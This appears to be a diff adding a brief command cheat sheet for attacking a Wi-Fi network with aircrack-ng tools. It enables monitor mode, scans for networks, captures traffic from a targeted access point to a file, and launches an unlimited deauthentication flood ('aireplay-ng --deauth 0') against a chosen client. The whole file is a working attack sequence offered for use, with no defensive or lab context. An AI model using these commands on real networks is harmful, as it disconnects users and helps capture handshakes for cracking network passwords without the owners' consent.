@@ -1,0 +1,37 @@
+
+
+
+
+#-- Check if the wireless card is connected
+iwconfig
+
+#-- Start the interface
+airmon-ng start wlan0
+
+#-- Should see wlan0mon or mon0
+
+
+#-- check wlans
+airodump-ng mon0 
+
+
+
+#-- Target specific wlan
+airodump-ng --bssid <XX:XX...> -c <channel> -w <wlanname> mon0
+
+#-- In another terminal
+aireplay-ng --deauth 0 -a <XX::XX..> -c <client> mon0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
